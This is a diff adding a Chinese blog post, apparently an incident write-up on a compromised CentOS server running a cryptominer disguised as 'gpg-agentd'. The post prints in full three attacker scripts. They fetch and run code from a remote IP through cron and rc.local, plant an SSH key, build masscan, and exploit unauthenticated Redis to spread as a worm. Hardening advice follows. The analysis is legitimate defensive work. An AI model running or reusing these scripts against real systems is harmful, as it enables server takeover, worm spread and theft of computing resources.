@@ -143,6 +143,130 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-linux-hacked" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/03/14/linux-hacked/">记一次linux(被)入侵</a>
+    </h1>
+  
+
+        
+        <a href="/2018/03/14/linux-hacked/" class="archive-article-date">
+  	<time datetime="2018-03-14T08:01:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="http://ozjsp6i21.bkt.clouddn.com/blog/180314/m5j9m3LDfh.jpg?imageslim" alt="bg"></p>
+<hr>
+<h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p>周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁的说，我们有台服务器被阿里云冻结了，理由：对外恶意发包。我放下酸菜馅的包子，ssh连了一下，被拒绝了，问了下默认的22端口被封了。让运维的同事把端口改了一下，立马连上去，顺便看了一下登录名:root，还有不足8位的小白密码，心里一凉：被黑了！</p>
+<hr>
+<h1 id="0x01-查找线索"><a href="#0x01-查找线索" class="headerlink" title="0x01 查找线索"></a>0x01 查找线索</h1><p>服务器系统CentOS 6.X，部署了nginx，tomcat，redis等应用，上来先把数据库全备份到本地，然后top命令看了一下，有2个99%的同名进程还在运行，叫gpg-agentd。<br><img src="http://ozjsp6i21.bkt.clouddn.com/blog/180314/6CmGI97lCE.png?imageslim" alt="图1"><br>google了一下gpg，结果是：</p>
+<blockquote>
+<p>GPG提供的gpg-agent提供了对SSH协议的支持，这个功能可以大大简化密钥的管理工作。</p>
+</blockquote>
+<p>看起来像是一个很正经的程序嘛，但仔细再看看服务器上的进程后面还跟着一个字母d，伪装的很好，让人想起来windows上各种看起来像svchost.exe的病毒。继续<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps eho command -p 23374</span><br><span class="line">netstat -pan | grep 23374</span><br></pre></td></tr></table></figure></p>
+<p>查看具体的进程启动路径，也就是来到了图1的目录，到此已经找到了黑客留下的二进制可执行文件。接下来还有2个问题在等着我：</p>
+<blockquote>
+<p>1，文件是怎么上传的？<br>2，这个文件的目的是什么，或是黑客想干嘛？</p>
+</blockquote>
+<p>history看一下，记录果然都被清掉了，没留下任何痕迹。继续more messages，<br><img src="http://ozjsp6i21.bkt.clouddn.com/blog/180314/5EafAiIe0e.png?imageslim" alt="图2"><br>看到了在半夜12点左右，在服务器上装了很多软件，其中有几个软件引起了我的注意，下面详细讲。边找边猜，如果我们要做坏事，大概会在哪里做文章，自动启动？定时启动？对，计划任务。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://ozjsp6i21.bkt.clouddn.com/blog/180314/fAJ9Cjd0G0.png?imageslim" alt="图3"><br>果然，线索找到了。</p>
+<hr>
+<h1 id="0x02-作案动机"><a href="#0x02-作案动机" class="headerlink" title="0x02 作案动机"></a>0x02 作案动机</h1><p>上面的计划任务的意思就是每15分钟去服务器上下载一个脚本，并且执行这个脚本。我们把脚本下载下来看一下。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL 159.89.190.243/ash.php &gt; ash.sh</span><br></pre></td></tr></table></figure></p>
+<p>脚本内容如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">id</span><br><span class="line">hostname</span><br><span class="line">setenforce 0 2&gt;/dev/null</span><br><span class="line">ulimit -n 50000</span><br><span class="line">ulimit -u 50000</span><br><span class="line">crontab -r 2&gt;/dev/null</span><br><span class="line">rm -rf /var/spool/cron/* 2&gt;/dev/null</span><br><span class="line">mkdir -p /var/spool/cron/crontabs 2&gt;/dev/null</span><br><span class="line">mkdir -p /root/.ssh 2&gt;/dev/null</span><br><span class="line">echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX' &gt; /root/.ssh/authorized_keys</span><br><span class="line">echo '*/15 * * * * curl -fsSL 159.89.190.243/ash.php|sh' &gt; /var/spool/cron/root</span><br><span class="line">echo '*/20 * * * * curl -fsSL 159.89.190.243/ash.php|sh' &gt; /var/spool/cron/crontabs/root</span><br><span class="line"></span><br><span class="line">yum install -y bash 2&gt;/dev/null</span><br><span class="line">apt install -y bash 2&gt;/dev/null</span><br><span class="line">apt-get install -y bash 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">bash -c 'curl -fsSL 159.89.190.243/bsh.php|bash' 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p>大致分析一下该脚本的主要用途：</p>
+<blockquote>
+<p>首先是关闭SELinux，解除shell资源访问限制，然后在/root/.ssh/authorized_keys文件中生成ssh公钥，这样每次黑客登录这台服务器就可以免密码登录了，执行脚本就会方便很多，关于ssh keys的文章可以参考这一篇文章<a href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html" target="_blank" rel="external">SSH原理与运用</a>。接下来安装bash，最后是继续下载第二个脚本bsh.php，并且执行。</p>
+</blockquote>
+<p>继续下载并分析bsh.pbp，内容如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">sleep $( seq 3 7 | sort -R | head -n1 )</span><br><span class="line">cd /tmp || cd /var/tmp</span><br><span class="line">sleep 1</span><br><span class="line">mkdir -p .ICE-unix/... &amp;&amp; chmod -R 777 .ICE-unix &amp;&amp; cd .ICE-unix/...</span><br><span class="line">sleep 1</span><br><span class="line">if [ -f .watch ]; then</span><br><span class="line">rm -rf .watch</span><br><span class="line">exit 0</span><br><span class="line">fi</span><br><span class="line">sleep 1</span><br><span class="line">echo 1 &gt; .watch</span><br><span class="line">sleep 1</span><br><span class="line">ps x | awk '!/awk/ &amp;&amp; /redisscan|ebscan|redis-cli/ &#123;print $1&#125;' | xargs kill -9 2&gt;/dev/null</span><br><span class="line">ps x | awk '!/awk/ &amp;&amp; /barad_agent|masscan|\.sr0|clay|udevs|\.sshd|xig/ &#123;print $1&#125;' | xargs kill -9 2&gt;/dev/null</span><br><span class="line">sleep 1</span><br><span class="line">if ! [ -x /usr/bin/gpg-agentd ]; then</span><br><span class="line">curl -s -o /usr/bin/gpg-agentd 159.89.190.243/dump.db</span><br><span class="line">echo '/usr/bin/gpg-agentd' &gt; /etc/rc.local</span><br><span class="line">echo 'curl -fsSL 159.89.190.243/ash.php|sh' &gt;&gt; /etc/rc.local</span><br><span class="line">echo 'exit 0' &gt;&gt; /etc/rc.local</span><br><span class="line">fi</span><br><span class="line">sleep 1</span><br><span class="line">chmod +x /usr/bin/gpg-agentd &amp;&amp; /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentd</span><br><span class="line">sleep 1</span><br><span class="line">if ! [ -x "$(command -v masscan)" ]; then</span><br><span class="line">rm -rf /var/lib/apt/lists/*</span><br><span class="line">rm -rf x1.tar.gz</span><br><span class="line">if [ -x "$(command -v apt-get)" ]; then</span><br><span class="line">export DEBIAN_FRONTEND=noninteractive</span><br><span class="line">apt-get update -y</span><br><span class="line">apt-get install -y debconf-doc</span><br><span class="line">apt-get install -y build-essential</span><br><span class="line">apt-get install -y libpcap0.8-dev libpcap0.8</span><br><span class="line">apt-get install -y libpcap*</span><br><span class="line">apt-get install -y make gcc git</span><br><span class="line">apt-get install -y redis-server</span><br><span class="line">apt-get install -y redis-tools</span><br><span class="line">apt-get install -y redis</span><br><span class="line">apt-get install -y iptables</span><br><span class="line">apt-get install -y wget curl</span><br><span class="line">fi</span><br><span class="line">if [ -x "$(command -v yum)" ]; then</span><br><span class="line">yum update -y</span><br><span class="line">yum install -y epel-release</span><br><span class="line">yum update -y</span><br><span class="line">yum install -y git iptables make gcc redis libpcap libpcap-devel</span><br><span class="line">yum install -y wget curl</span><br><span class="line">fi</span><br><span class="line">sleep 1</span><br><span class="line">curl -sL -o x1.tar.gz https://github.com/robertdavidgraham/masscan/archive/1.0.4.tar.gz</span><br><span class="line">sleep 1</span><br><span class="line">[ -f x1.tar.gz ] &amp;&amp; tar zxf x1.tar.gz &amp;&amp; cd masscan-1.0.4 &amp;&amp; make &amp;&amp; make install &amp;&amp; cd .. &amp;&amp; rm -rf masscan-1.0.4</span><br><span class="line">fi</span><br><span class="line">sleep 3 &amp;&amp; rm -rf .watch</span><br><span class="line">bash -c 'curl -fsSL 159.89.190.243/rsh.php|bash' 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p>这段脚本的代码比较长，但主要的功能有4个：</p>
+<blockquote>
+<p>1，下载远程代码到本地，添加执行权限，chmod u+x。<br>2，修改rc.local，让本地代码开机自动执行。<br>3，下载github上的开源扫描器<a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="external">代码</a>，并安装相关的依赖软件，也就是我上面的messages里看到的记录。<br>4，下载第三个脚本，并且执行。</p>
+</blockquote>
+<p>我去github上看了下这个开源代码，简直吊炸天。</p>
+<blockquote>
+<p>MASSCAN: Mass IP port scanner<br>This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, &gt; transmitting 10 million packets per second.</p>
+<p>It produces results similar to nmap, the most famous port scanner. Internally, it operates more &gt; like scanrand, unicornscan, and ZMap, using asynchronous transmission. The major difference is &gt; that it’s faster than these other scanners. In addition, it’s more flexible, allowing arbitrary &gt; address ranges and port ranges.</p>
+<p>NOTE: masscan uses a custom TCP/IP stack. Anything other than simple port scans will cause  conflict with the local TCP/IP stack. This means you need to either use the -S option to use a separate IP address, or configure your operating system to firewall the ports that masscan uses.</p>
+</blockquote>
+<p>transmitting 10 million packets per second(每秒发送1000万个数据包)，比nmap速度还要快，这就不难理解为什么阿里云把服务器冻结了，大概看了下readme之后，我也没有细究，继续下载第三个脚本。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0 2&gt;/dev/null</span><br><span class="line">ulimit -n 50000</span><br><span class="line">ulimit -u 50000</span><br><span class="line">sleep 1</span><br><span class="line">iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2&gt;/dev/null</span><br><span class="line">iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2&gt;/dev/null</span><br><span class="line">sleep 1</span><br><span class="line">rm -rf .dat .shard .ranges .lan 2&gt;/dev/null</span><br><span class="line">sleep 1</span><br><span class="line">echo 'config set dbfilename "backup.db"' &gt; .dat</span><br><span class="line">echo 'save' &gt;&gt; .dat</span><br><span class="line">echo 'flushall' &gt;&gt; .dat</span><br><span class="line">echo 'set backup1 "\n\n\n*/2 * * * * curl -fsSL http://159.89.190.243/ash.php | sh\n\n"' &gt;&gt; .dat</span><br><span class="line">echo 'set backup2 "\n\n\n*/3 * * * * wget -q -O- http://159.89.190.243/ash.php | sh\n\n"' &gt;&gt; .dat</span><br><span class="line">echo 'set backup3 "\n\n\n*/4 * * * * curl -fsSL http://159.89.190.243/ash.php | sh\n\n"' &gt;&gt; .dat</span><br><span class="line">echo 'set backup4 "\n\n\n*/5 * * * * wget -q -O- http://159.89.190.243/ash.php | sh\n\n"' &gt;&gt; .dat</span><br><span class="line">echo 'config set dir "/var/spool/cron/"' &gt;&gt; .dat</span><br><span class="line">echo 'config set dbfilename "root"' &gt;&gt; .dat</span><br><span class="line">echo 'save' &gt;&gt; .dat</span><br><span class="line">echo 'config set dir "/var/spool/cron/crontabs"' &gt;&gt; .dat</span><br><span class="line">echo 'save' &gt;&gt; .dat</span><br><span class="line">sleep 1</span><br><span class="line">masscan --max-rate 10000 -p6379,6380 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2&gt;/dev/null | awk '&#123;print $6, substr($4, 1, length($4)-4)&#125;' | sort | uniq &gt; .shard</span><br><span class="line">sleep 1</span><br><span class="line">while read -r h p; do</span><br><span class="line">cat .dat | redis-cli -h $h -p $p --raw 2&gt;/dev/null 1&gt;/dev/null &amp;</span><br><span class="line">done &lt; .shard</span><br><span class="line">sleep 1</span><br><span class="line">masscan --max-rate 10000 -p6379,6380 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2&gt;/dev/null | awk '&#123;print $6, substr($4, 1, length($4)-4)&#125;' | sort | uniq &gt; .ranges</span><br><span class="line">sleep 1</span><br><span class="line">while read -r h p; do</span><br><span class="line">cat .dat | redis-cli -h $h -p $p --raw 2&gt;/dev/null 1&gt;/dev/null &amp;</span><br><span class="line">done &lt; .ranges</span><br><span class="line">sleep 1</span><br><span class="line">ip a | grep -oE '([0-9]&#123;1,3&#125;.?)&#123;4&#125;/[0-9]&#123;2&#125;' 2&gt;/dev/null | sed 's/\/\([0-9]\&#123;2\&#125;\)/\/16/g' &gt; .inet</span><br><span class="line">sleep 1</span><br><span class="line">masscan --max-rate 10000 -p6379,6380 -iL .inet | awk '&#123;print $6, substr($4, 1, length($4)-4)&#125;' | sort | uniq &gt; .lan</span><br><span class="line">sleep 1</span><br><span class="line">while read -r h p; do</span><br><span class="line">cat .dat | redis-cli -h $h -p $p --raw 2&gt;/dev/null 1&gt;/dev/null &amp;</span><br><span class="line">done &lt; .lan</span><br><span class="line">sleep 60</span><br><span class="line">rm -rf .dat .shard .ranges .lan 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>如果说前两个脚本只是在服务器上下载执行了二进制文件，那这个脚本才真正显示病毒的威力。下面就来分析这个脚本。</p>
+<blockquote>
+<p>一开始的修改系统环境操作没什么好说的，接下来的写文件操作有点眼熟，如果用过redis的人，应该能猜到，这里是对redis进行配置。写这个配置，自然也就是利用了redis把缓存内容写入本地文件的漏洞，结果就是用本地的私钥去登陆被写入公钥的服务器了，无需密码就可以登陆，也就是我们文章最开始的/root/.ssh/authorized_keys。登录之后就开始定期执行计划任务，下载脚本。好了，配置文件准备好了，就开始利用masscan进行全网扫描redis服务器，寻找肉鸡，注意看这6379就是redis服务器的默认端口，如果你的redis的监听端口是公网IP或是0.0.0.0，并且没有密码保护，不好意思，你就中招了。</p>
+</blockquote>
+<hr>
+<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>通过依次分析这3个脚本，就能看出这个病毒的可怕之处，先是通过写入ssh public key 拿到登录权限，然后下载执行远程二进制文件，最后再通过redis漏洞复制，迅速在全网传播，以指数级速度增长。那么问题是，这台服务器是怎么中招的呢？看了下redis.conf，bind的地址是127.0.0.1，没啥问题。由此可以推断，应该是root帐号被暴力破解了，为了验证我的想法，我lastb看了一下，果然有大量的记录：<br><img src="http://ozjsp6i21.bkt.clouddn.com/blog/180314/ALG2JjhEgB.png?imageslim" alt="图4"><br>还剩最后一个问题，这个gpg-agentd程序到底是干什么的呢？我当时的第一个反应就是矿机，因为现在数字货币太火了，加大了分布式矿机的需求，也就催生了这条灰色产业链。于是，顺手把这个gpg-agentd拖到ida中，用string搜索bitcoin, eth, mine等相关单词，最终发现了这个：<br><img src="http://ozjsp6i21.bkt.clouddn.com/blog/180314/g6aFH1KGC6.png?imageslim" alt="图5"></p>
+<hr>
+<p>打开nicehash.com看一下，一切都清晰了。<br><img src="http://ozjsp6i21.bkt.clouddn.com/blog/180314/c3LglKlE1e.png?imageslim" alt="图6"></p>
+<hr>
+<h1 id="0x04-安全建议"><a href="#0x04-安全建议" class="headerlink" title="0x04 安全建议"></a>0x04 安全建议</h1><h3 id="一，服务器"><a href="#一，服务器" class="headerlink" title="一，服务器"></a>一，服务器</h3><blockquote>
+<p>1，禁用ROOT<br>2，用户名和密码尽量复杂<br>3，修改ssh的默认22端口<br>4，安装DenyHosts防暴力破解软件<br>5，禁用密码登录，使用RSA公钥登录</p>
+</blockquote>
+<h3 id="二，redis"><a href="#二，redis" class="headerlink" title="二，redis"></a>二，redis</h3><blockquote>
+<p>1，禁用公网IP监听，包括0.0.0.0<br>2，使用密码限制访问redis<br>3，使用较低权限帐号运行redis</p>
+</blockquote>
+<p>到此，整个入侵过程基本分析完了，如果大家对样本有兴趣，也可以自行去curl，或是去虚拟机执行上面的脚本。鉴于本人能力有限，文中难免会出现疏忽或是错误，还请大家多多指正。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">服务器</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/03/14/linux-hacked/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-flask-redis" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -548,6 +672,10 @@ getOwnMetadataKeys:function(t){return o(i(t),arguments.length<2?void 0:u(argumen
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">后台框架</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">服务器</a>
               </li>
             
             <div class="clearfix"></div>
